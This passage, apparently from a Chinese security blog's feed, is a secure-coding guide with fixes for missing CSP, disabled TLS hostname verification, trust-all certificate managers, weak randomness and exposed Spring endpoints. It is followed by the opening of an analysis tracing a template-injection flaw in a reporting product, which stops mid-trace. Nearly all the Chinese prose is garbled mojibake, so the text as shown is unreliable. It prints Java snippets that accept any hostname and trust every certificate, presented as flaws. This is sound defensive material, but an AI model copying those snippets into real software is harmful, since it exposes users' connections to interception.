å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆContent Security Policy, CSPï¼‰æ˜¯ä¸€ç§å®‰å…¨æ ‡å‡†ï¼Œç”¨äºé¢„é˜²è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ”»å‡»å’Œå…¶ä»–ä¸€äº›æ³¨å…¥ç±»å‹çš„æ”»å‡»ã€‚CSPé€šè¿‡ç™½åå•æ§åˆ¶å“ªäº›èµ„æºå¯ä»¥è¢«æµè§ˆå™¨åŠ è½½å’Œæ‰§è¡Œï¼Œä»¥æ­¤æé«˜ç½‘ç«™çš„å®‰å…¨æ€§ã€‚æœªé…ç½®CSPæˆ–é…ç½®ä¸å½“çš„CSPå¯ä»¥è®©ç½‘ç«™æ˜“å—XSSæ”»å‡»ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥æ¶æ„è„šæœ¬ï¼Œçªƒå–æ•æ„Ÿæ•°æ®ã€ç¯¡æ”¹é¡µé¢å†…å®¹æˆ–è¿›è¡Œå…¶ä»–æ¶æ„æ´»åŠ¨ã€‚æœªé…ç½®CSPçš„ç½‘ç«™æ²¡æœ‰åˆ©ç”¨æµè§ˆå™¨æä¾›çš„è¿™ä¸€é¢å¤–å®‰å…¨å±‚ä¿æŠ¤ï¼Œä½¿å…¶æ›´å®¹æ˜“å—åˆ°å‰ç«¯æ”»å‡»ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å¯ç”¨å¹¶æ­£ç¡®é…ç½®CSPï¼šé€šè¿‡HTTPå“åº”å¤´Content-Security-Policyå¯ç”¨CSPï¼Œå¹¶ä¸¥æ ¼é™åˆ¶è„šæœ¬æ¥æºã€æ ·å¼ã€å›¾ç‰‡ã€å­—ä½“ã€è¡¨å•ç›®æ ‡å’Œå…¶ä»–èµ„æºçš„åŠ è½½ã€‚ç¡®ä¿ä»…å…è®¸ä»å¯ä¿¡æ¥æºåŠ è½½èµ„æºã€‚&lt;/li&gt;
&lt;li&gt;é¿å…ä½¿ç”¨unsafe-inlineå’Œunsafe-evalæŒ‡ä»¤ï¼šè¿™äº›æŒ‡ä»¤å…è®¸è¡Œå†…è„šæœ¬å’Œevalæ‰§è¡Œï¼Œé™ä½CSPçš„æ•ˆæœã€‚å°½é‡é¿å…ä½¿ç”¨å®ƒä»¬ï¼Œä»¥æé«˜æ”¿ç­–çš„æ•ˆæœã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸå®¡æŸ¥å’Œæ›´æ–°CSPï¼šéšç€åº”ç”¨ç¨‹åºçš„å‘å±•ï¼Œå®šæœŸå®¡æŸ¥å’Œæ›´æ–°CSPè§„åˆ™ï¼Œä»¥ç¡®ä¿å®ƒä»¬ä»ç„¶æœ‰æ•ˆå¹¶ä¸”ç¬¦åˆå½“å‰çš„å†…å®¹å®‰å…¨éœ€æ±‚ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨æŠ¥å‘Šæœºåˆ¶ï¼šåœ¨CSPä¸­ä½¿ç”¨report-uriæˆ–report-toæŒ‡ä»¤ï¼Œå°†è¿åæ”¿ç­–çš„æŠ¥å‘Šå‘é€åˆ°æœåŠ¡å™¨ã€‚è¿™æœ‰åŠ©äºè¯†åˆ«å¯èƒ½çš„æ”»å‡»å’Œé…ç½®é”™è¯¯ã€‚&lt;/li&gt;
&lt;li&gt;è¿›è¡Œå½»åº•çš„æµ‹è¯•ï¼šåœ¨éƒ¨ç½²CSPä¹‹å‰ï¼Œå¯¹ç½‘ç«™è¿›è¡Œå½»åº•çš„æµ‹è¯•ï¼Œç¡®ä¿ç­–ç•¥ä¸ä¼šé˜»æ–­åˆæ³•èµ„æºçš„åŠ è½½ï¼Œå½±å“ç½‘ç«™åŠŸèƒ½ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;æœåŠ¡å™¨èº«ä»½éªŒè¯å…³é—­&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨SSL/TLSè¿æ¥ä¸­ï¼ŒæœåŠ¡å™¨èº«ä»½éªŒè¯æ˜¯ç¡®ä¿å®¢æˆ·ç«¯ä¸çœŸæ­£çš„æœåŠ¡å™¨è¿›è¡Œé€šä¿¡çš„å…³é”®æ­¥éª¤ã€‚è¿™ä¸€è¿‡ç¨‹é€šå¸¸æ¶‰åŠéªŒè¯æœåŠ¡å™¨æä¾›çš„SSL/TLSè¯ä¹¦ï¼Œç¡®ä¿å…¶ç”±å—ä¿¡ä»»çš„è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ç­¾å‘ï¼Œä¸”ä¸æ‰€è¯·æ±‚çš„æœåŠ¡å™¨åŸŸååŒ¹é…ã€‚å¦‚æœæœåŠ¡å™¨èº«ä»½éªŒè¯è¢«ç¦ç”¨ï¼Œå®¢æˆ·ç«¯å¯èƒ½ä¼šæ— æ³•ç¡®è®¤å…¶æ­£åœ¨ä¸é¢„æœŸçš„æœåŠ¡å™¨è¿›è¡Œå®‰å…¨é€šä¿¡ï¼Œè¿™å¯èƒ½å¯¼è‡´ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹æˆ–é‡å®šå‘æ•°æ®ä¼ è¾“ã€‚
ä¾‹å¦‚å¦‚ä¸‹ä»£ç é€šè¿‡è‡ªå®šä¹‰verifyæ–¹æ³•æ¥å…³é—­èº«ä»½éªŒè¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class InsecureConnection {
    public static void main(String[] args) throws Exception {
        HttpsURLConnection connection = (HttpsURLConnection) new URL(&quot;https://example.com&quot;).openConnection();
        connection.setHostnameVerifier(new HostnameVerifier() {
            @Override
            public boolean verify(String hostname, SSLSession session) {
                return true;  // ä¸å®‰å…¨ï¼Œå› ä¸ºå®ƒä¸è¿›è¡Œä»»ä½•éªŒè¯
            }
        });
        trustAllHttpsCertificates(connection); // å‡è®¾è¿™ä¸ªæ–¹æ³•ä½¿è¿æ¥ä¿¡ä»»æ‰€æœ‰è¯ä¹¦
    }

    private static void trustAllHttpsCertificates(HttpsURLConnection conn) {
        // å®ç°ç»†èŠ‚å‡è®¾ï¼Œä¿¡ä»»æ‰€æœ‰è¯ä¹¦çš„é€»è¾‘
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å§‹ç»ˆå¯ç”¨æœåŠ¡å™¨èº«ä»½éªŒè¯ï¼šåœ¨SSL/TLSè¿æ¥ä¸­ï¼Œç¡®ä¿æ€»æ˜¯è¿›è¡ŒæœåŠ¡å™¨èº«ä»½éªŒè¯ã€‚ä¸åº”æœ‰ä»»ä½•æƒ…å†µä¸‹ç¦ç”¨æ­¤åŠŸèƒ½ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨æ­£ç¡®é…ç½®çš„SSL/TLSè¯ä¹¦ï¼šä½¿ç”¨ç”±å—ä¿¡ä»»CAç­¾å‘çš„è¯ä¹¦ï¼Œå¹¶ç¡®ä¿è¯ä¹¦ä¸­åŒ…å«æ­£ç¡®çš„æœåŠ¡å™¨åç§°ï¼ˆå³æœåŠ¡å™¨çš„åŸŸåï¼‰ã€‚&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥è¯ä¹¦æ’¤é”€çŠ¶æ€ï¼šåœ¨æ¥å—è¯ä¹¦ä¹‹å‰ï¼Œæ£€æŸ¥å…¶æ˜¯å¦è¢«é¢å‘æœºæ„æ’¤é”€ã€‚è¿™å¯ä»¥é€šè¿‡åœ¨çº¿è¯ä¹¦çŠ¶æ€åè®®ï¼ˆOCSPï¼‰æˆ–è¯ä¹¦æ’¤é”€åˆ—è¡¨ï¼ˆCRLï¼‰æ¥å®Œæˆã€‚&lt;/li&gt;
&lt;li&gt;å¼ºåˆ¶è¯ä¹¦é“¾éªŒè¯ï¼šç¡®ä¿SSL/TLSåº“æˆ–ä½¿ç”¨çš„æ¡†æ¶éªŒè¯è¯ä¹¦é“¾çš„æ‰€æœ‰éƒ¨åˆ†ï¼Œç›´åˆ°æ ¹è¯ä¹¦ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å®‰å…¨ç¼–ç¨‹å®è·µï¼šåœ¨ç¼–å†™ç”¨äºå»ºç«‹SSL/TLSè¿æ¥çš„ä»£ç æ—¶ï¼Œä½¿ç”¨å®‰å…¨åº“å’Œéµå¾ªæœ€ä½³å®è·µï¼Œç¡®ä¿ä¸ä¼šå› é…ç½®é”™è¯¯è€Œç¦ç”¨å®‰å…¨åŠŸèƒ½ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;è¿‡äºå®½æ³›çš„è¯ä¹¦ä¿¡ä»»&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨SSL/TLSè¿æ¥ä¸­ï¼Œè¿‡äºå®½æ³›çš„è¯ä¹¦ä¿¡ä»»æŒ‡çš„æ˜¯åº”ç”¨ç¨‹åºé…ç½®ä¸ºä¿¡ä»»å¹¿æ³›èŒƒå›´å†…çš„è¯ä¹¦ï¼ŒåŒ…æ‹¬é‚£äº›ä¸åº”è¢«ä¿¡ä»»çš„è¯ä¹¦ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªåº”ç”¨ç¨‹åºå¯èƒ½é…ç½®ä¸ºä¿¡ä»»ä»»ä½•ç”±ç‰¹å®šå›½å®¶çš„è¯ä¹¦é¢å‘æœºæ„ï¼ˆCAï¼‰ç­¾å‘çš„è¯ä¹¦ï¼Œæˆ–è€…ä¸æ­£ç¡®åœ°é…ç½®ä¸ºä¿¡ä»»æ‰€æœ‰è‡ªç­¾åçš„è¯ä¹¦ã€‚è¿™ç§å®½æ³›çš„ä¿¡ä»»ç­–ç•¥ä¼šé™ä½åº”ç”¨ç¨‹åºçš„å®‰å…¨æ€§ï¼Œä½¿å…¶å®¹æ˜“å—åˆ°ä¸­é—´äººæ”»å‡»ï¼ˆMITMï¼‰ï¼Œåœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨æ— æ•ˆæˆ–æœªç»éªŒè¯çš„è¯ä¹¦æ¥æ‹¦æˆªæˆ–ç¯¡æ”¹åŠ å¯†çš„é€šä¿¡ã€‚
ä¾‹å¦‚å¦‚ä¸‹ä»£ç ä¿¡ä»»æ‰€æœ‰çš„è¯ä¹¦ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class InsecureTrustManager {
    public static void main(String[] args) throws Exception {
        SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);
        TrustManager[] trustAllCerts = new TrustManager[] {
            new X509TrustManager() {
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return null;
                }
                public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
                public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) { }
            }
        };
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        // è¿™ç§åšæ³•éå¸¸ä¸å®‰å…¨ï¼Œå› ä¸ºå®ƒä¿¡ä»»æ‰€æœ‰è¯ä¹¦
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨å—ä¿¡ä»»çš„CAåˆ—è¡¨ï¼šåº”ç”¨ç¨‹åºåº”ä»…ä¿¡ä»»ç”±å·²çŸ¥å¯é çš„è¯ä¹¦é¢å‘æœºæ„ç­¾å‘çš„è¯ä¹¦ã€‚è¿™å¯ä»¥é€šè¿‡é…ç½®æœåŠ¡å™¨æˆ–å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºä½¿ç”¨åŒ…å«è¿™äº›å—ä¿¡ä»»CAçš„åˆ—è¡¨æ¥å®ç°ã€‚&lt;/li&gt;
&lt;li&gt;éªŒè¯è¯ä¹¦é“¾ï¼šç¡®ä¿åº”ç”¨ç¨‹åºåœ¨å»ºç«‹SSL/TLSè¿æ¥æ—¶éªŒè¯æ•´ä¸ªè¯ä¹¦é“¾ï¼ŒåŒ…æ‹¬æ ¹è¯ä¹¦å’Œæ‰€æœ‰ä¸­é—´è¯ä¹¦ã€‚&lt;/li&gt;
&lt;li&gt;è¯ä¹¦å›ºå®šï¼ˆCertificate Pinningï¼‰ï¼šé€šè¿‡è¯ä¹¦å›ºå®šï¼Œåº”ç”¨ç¨‹åºåªä¿¡ä»»é¢„è®¾ï¼ˆæˆ–å›ºå®šï¼‰çš„ä¸€ä¸ªæˆ–å¤šä¸ªç‰¹å®šè¯ä¹¦æˆ–å…¬é’¥ã€‚è¿™å¯ä»¥æœ‰æ•ˆé˜²æ­¢ä¿¡ä»»è¢«æ¶æ„æˆ–é”™è¯¯é¢å‘çš„è¯ä¹¦ã€‚&lt;/li&gt;
&lt;li&gt;ç¦ç”¨è‡ªç­¾åè¯ä¹¦çš„ä¿¡ä»»ï¼šé™¤éåœ¨ç‰¹å®šçš„ã€å—æ§çš„ç¯å¢ƒä¸­ï¼ˆå¦‚å†…éƒ¨æµ‹è¯•ç¯å¢ƒï¼‰ï¼Œå¦åˆ™ä¸åº”ä¿¡ä»»è‡ªç­¾åè¯ä¹¦ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸæ›´æ–°ä¿¡ä»»å­˜å‚¨ï¼šå®šæœŸæ›´æ–°åŒ…å«å—ä¿¡ä»»è¯ä¹¦é¢å‘æœºæ„çš„ä¿¡ä»»å­˜å‚¨ï¼Œä»¥åŒ…æ‹¬æ–°çš„CAå’Œå‰”é™¤å·²ä¸å†å®‰å…¨æˆ–å·²è¢«æ’¤é”€çš„CAã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ä¾‹å¦‚å¦‚ä¸‹ä»£ç ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ä¿¡ä»»ç®¡ç†å™¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class SecureTrustManager {
    public static void main(String[] args) throws Exception {
        SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);
        sc.init(null, null, new java.security.SecureRandom()); // ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ä¿¡ä»»ç®¡ç†å™¨
        HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        // ä½¿ç”¨ç³»ç»Ÿé»˜è®¤çš„ä¿¡ä»»ç®¡ç†å™¨å¯ä»¥ç¡®ä¿åªä¿¡ä»»ç”±å—ä¿¡ä»»CAç­¾å‘çš„è¯ä¹¦
    }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;å…¶ä»–&lt;/h1&gt;
&lt;h3&gt;å¼±éšæœºæ€§&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
å¼±éšæœºæ€§é—®é¢˜å‘ç”Ÿåœ¨è½¯ä»¶ç³»ç»Ÿä½¿ç”¨äº†ä¸å¤Ÿå¼ºå¤§çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼ˆRNGï¼‰ï¼Œå°¤å…¶æ˜¯åœ¨å®‰å…¨ç›¸å…³çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œå¦‚ç”Ÿæˆä¼šè¯æ ‡è¯†ç¬¦ã€å¯†ç æˆ–åŠ å¯†å¯†é’¥æ—¶ã€‚ä½¿ç”¨å¼±éšæœºæ•°ç”Ÿæˆå™¨äº§ç”Ÿçš„å€¼å¯èƒ½å®¹æ˜“è¢«é¢„æµ‹ï¼Œä»è€Œä½¿å¾—ç³»ç»Ÿå®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå¦‚é‡æ”¾æ”»å‡»ã€ä¼šè¯åŠ«æŒå’Œå…¶ä»–åŸºäºé¢„æµ‹éšæœºæ•°çš„æ”»å‡»ã€‚è¿™ç±»é—®é¢˜å°¤å…¶åœ¨ä½¿ç”¨æ ‡å‡†çš„æ•°å­¦å‡½æ•°åº“ç”Ÿæˆâ€œä¼ªéšæœºæ•°â€æ—¶æ˜¾è‘—ï¼Œè¿™äº›éšæœºæ•°å®é™…ä¸Šæ˜¯å¯ä»¥è¢«é¢„æµ‹çš„ï¼Œç‰¹åˆ«æ˜¯å¦‚æœæ”»å‡»è€…çŸ¥é“äº†ç”Ÿæˆç®—æ³•å’Œç”¨äºç§å­çš„åˆå§‹å€¼ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨å¯†ç å­¦å®‰å…¨çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼ˆCSPRNGï¼‰ï¼šé€‰æ‹©ä¸€ç§ä¸“ä¸ºå®‰å…¨ç›®çš„è®¾è®¡çš„éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå¦‚Javaä¸­çš„SecureRandomç±»ï¼Œè€Œä¸æ˜¯ç®€å•çš„Randomç±»ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸæ›´æ¢éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­ï¼šåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œå®šæœŸæ›´æ–°éšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­å€¼ï¼Œå°¤å…¶æ˜¯åœ¨æ£€æµ‹åˆ°å¯èƒ½çš„å®‰å…¨äº‹ä»¶åã€‚&lt;/li&gt;
&lt;li&gt;é¿å…è‡ªå®šä¹‰éšæœºæ•°ç”Ÿæˆç®—æ³•ï¼šå°½å¯èƒ½ä½¿ç”¨ç»è¿‡éªŒè¯çš„åº“å’Œå‡½æ•°ï¼Œé¿å…è‡ªå®šä¹‰ç®—æ³•ï¼Œå› ä¸ºè¿™äº›å¯èƒ½ä¼šæœ‰æœªè¢«å‘ç°çš„å¼±ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;å¢åŠ éšæœºæ€§ï¼šå¯¹äºè¦æ±‚è¾ƒé«˜çš„å®‰å…¨åº”ç”¨ï¼Œå¯ä»¥è€ƒè™‘ç»“åˆå¤šä¸ªéšæœºæºæ¥å¢åŠ éšæœºæ€§ã€‚&lt;/li&gt;
&lt;li&gt;è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼šå®šæœŸå¯¹ä½¿ç”¨çš„éšæœºæ•°ç”Ÿæˆç­–ç•¥è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼Œç¡®ä¿å…¶ä»èƒ½æ»¡è¶³å½“å‰çš„å®‰å…¨éœ€æ±‚ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Springé»˜è®¤é…ç½®ä¸å½“&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;é—®é¢˜æè¿°ï¼š&lt;/strong&gt;
åœ¨ä½¿ç”¨Spring Bootå’Œç›¸å…³å®‰å…¨æ¡†æ¶æ—¶ï¼Œmanagement.security.enabledé…ç½®è´Ÿè´£å¼€å¯æˆ–å…³é—­å¯¹ç®¡ç†ç«¯ç‚¹çš„å®‰å…¨æ€§æ§åˆ¶ã€‚å¦‚æœè¯¥é…ç½®è®¾ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•æ„Ÿçš„ç®¡ç†ç«¯ç‚¹ï¼ˆå¦‚metrics, health, infoç­‰ï¼‰æš´éœ²ç»™æœªæˆæƒçš„ç”¨æˆ·ã€‚ä¾‹å¦‚ï¼Œå°†management.security.enabledè®¾ç½®ä¸ºfalseä¼šå…³é—­æ‰€æœ‰ç®¡ç†ç«¯ç‚¹çš„å®‰å…¨æ§åˆ¶ï¼Œä½¿å¾—ä»»ä½•äººéƒ½èƒ½è®¿é—®è¿™äº›ç«¯ç‚¹ï¼Œè¿™å¯èƒ½å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è¢«æ¶æ„åˆ©ç”¨ã€‚
&lt;strong&gt;ä¿®å¤å»ºè®®ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;é»˜è®¤å¯ç”¨å®‰å…¨æ€§æ§åˆ¶ï¼šå§‹ç»ˆç¡®ä¿management.security.enabledé…ç½®é¡¹é»˜è®¤ä¸ºtrueï¼Œä»¥ä¾¿æ‰€æœ‰ç®¡ç†ç«¯ç‚¹éƒ½å—åˆ°å®‰å…¨æ€§æ§åˆ¶ã€‚&lt;/li&gt;
&lt;li&gt;æ˜ç¡®æˆæƒè®¿é—®ï¼šä½¿ç”¨è§’è‰²å’Œæƒé™æ§åˆ¶æ¥ç¡®ä¿åªæœ‰æˆæƒçš„ç”¨æˆ·å¯ä»¥è®¿é—®ç®¡ç†ç«¯ç‚¹ã€‚è¿™å¯ä»¥é€šè¿‡Spring Securityæˆ–ç›¸åº”çš„å®‰å…¨æ¡†æ¶æ¥å®ç°ã€‚&lt;/li&gt;
&lt;li&gt;é™åˆ¶ç½‘ç»œè®¿é—®ï¼šé€šè¿‡ç½‘ç»œé…ç½®ï¼Œä¾‹å¦‚é˜²ç«å¢™æˆ–å®‰å…¨ç»„ï¼Œé™åˆ¶å¯¹ç®¡ç†ç«¯ç‚¹çš„è®¿é—®ï¼Œç¡®ä¿åªæœ‰å¯ä¿¡çš„å†…éƒ¨ç½‘ç»œå¯ä»¥è®¿é—®è¿™äº›ç«¯ç‚¹ã€‚&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨å¤šå±‚å®‰å…¨é˜²æŠ¤ï¼šç»“åˆä½¿ç”¨å¤šç§å®‰å…¨æªæ–½ï¼Œå¦‚èº«ä»½éªŒè¯ã€æˆæƒã€æ—¥å¿—è®°å½•å’Œç›‘æ§ï¼Œæ¥å¢å¼ºå¯¹ç®¡ç†ç«¯ç‚¹çš„ä¿æŠ¤ã€‚&lt;/li&gt;
&lt;li&gt;å®šæœŸå®¡æŸ¥å’Œæ›´æ–°é…ç½®ï¼šéšç€åº”ç”¨å’Œå®‰å…¨éœ€æ±‚çš„å˜åŒ–ï¼Œå®šæœŸå®¡æŸ¥å’Œæ›´æ–°ç›¸å…³çš„å®‰å…¨é…ç½®ã€‚&lt;/li&gt;
&lt;/ol&gt;
</content:encoded></item><item><title>æŸæŠ¥è¡¨æ¨¡æ¿æ³¨å…¥</title><link>https://www.springkill.club/posts/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</link><guid isPermaLink="true">https://www.springkill.club/posts/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</guid><pubDate>Tue, 23 Jul 2024 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;è¿™æ¬¡å…¬å¸ƒçš„æ¼æ´è¯´æ˜¯SQLæ³¨å…¥ï¼Œå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¨¡æ¿æ³¨å…¥ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨äº§å“ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º&lt;code&gt;TemplateUtils&lt;/code&gt; çš„ç±»ï¼Œè¿™ä¸ªç±»ç”¨æ¥å¤„ç†è¡¨è¾¾å¼ç›¸å…³çš„å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;ä¼ è¿›æ¥çš„è¡¨è¾¾å¼ä¼šè¿›å…¥&lt;code&gt;render&lt;/code&gt;æ–¹æ³•è¿›è¡Œæ¸²æŸ“ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723224905849-1726106018720-2.png&quot; alt=&quot;image-20240723224905849&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿›å»çœ‹æ¨¡æ¿å‚æ•°æ¸²æŸ“ä½¿ç”¨çš„æ–¹æ³•&lt;code&gt;renderParameter4Tpl&lt;/code&gt; ï¼Œå…¶ä¸­ä¸€ç›´åœ¨è°ƒç”¨åŒåæ–¹æ³•&lt;code&gt;render&lt;/code&gt; ï¼Œæœ€å¼€å§‹ä¼ å…¥äº†ä¸€ä¸ªæ–°çš„&lt;code&gt;Calculator&lt;/code&gt; ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723225237830.png&quot; alt=&quot;image-20240723225237830&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ä¸­é—´æœ‰ä¸€ä¸ª&lt;code&gt;evalRenderAction&lt;/code&gt; æŒ‡å®šäº†&lt;code&gt;RenderAction&lt;/code&gt;ï¼Œå…¶ä»–çš„ä¿¡æ¯ä¸å¤ªé‡è¦ï¼Œå¾€åçœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723232033511.png&quot; alt=&quot;image-20240723232033511&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿›åˆ°æœ€åä¸€ä¸ª&lt;code&gt;renderTpl&lt;/code&gt;åçœ‹åˆ°äº†è§£æè¡¨è¾¾å¼çš„ä½ç½®ï¼Œé€šè¿‡&lt;code&gt;ParameterProvider.PARAMETERPATTERN&lt;/code&gt;è¿›è¡Œè§£æï¼Œç„¶åå°±ä¼šè·å¾—è¡¨è¾¾å¼ä¸­çš„å†…å®¹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723225516954.png&quot; alt=&quot;image-20240723225516954&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723225420954.png&quot; alt=&quot;image-20240723225420954&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç»è¿‡å¤„ç†åè¿™é‡Œå°±ä¼šå–å‡º&lt;code&gt;${}&lt;/code&gt;ä¸­çš„å†…å®¹ï¼Œç„¶åé€åˆ°ä¸‹é¢ç”¨å‰é¢ä¼ å…¥çš„&lt;code&gt;RenderAction&lt;/code&gt;è¿›è¡Œæ¸²æŸ“ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723230757983.png&quot; alt=&quot;image-20240723230757983&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723230545758.png&quot; alt=&quot;image-20240723230545758&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è°ƒç”¨&lt;code&gt;var2.render&lt;/code&gt;è‡ªç„¶ä¹Ÿå°±æ˜¯å‰é¢ä¼ è¿›æ¥çš„&lt;code&gt;evalRenderAction&lt;/code&gt; äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723231732934.png&quot; alt=&quot;image-20240723231732934&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç»§ç»­å¾€ä¸‹ï¼Œä¼šèµ°åˆ°&lt;code&gt;evalString&lt;/code&gt; ï¼Œåœ¨è¿™é‡Œï¼Œä¼šå°†ä¼ å…¥çš„å†…å®¹è½¬æ¢ä¸º&lt;code&gt;Expression&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723233046321.png&quot; alt=&quot;image-20240723233046321&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè·Ÿå…¥è¿™ä¸ª&lt;code&gt;eval&lt;/code&gt;,å‘ç°äº†ä¸‹ä¸€ä¸ª&lt;code&gt;eval&lt;/code&gt;,è¿™é‡Œå°±æ˜¯å‰é¢çš„&lt;code&gt;Calculator&lt;/code&gt;ä¸‹çš„æ–¹æ³•äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20240723233646180.png&quot; alt=&quot;image-20240723233646180&quot; /&gt;&lt;/p&gt;
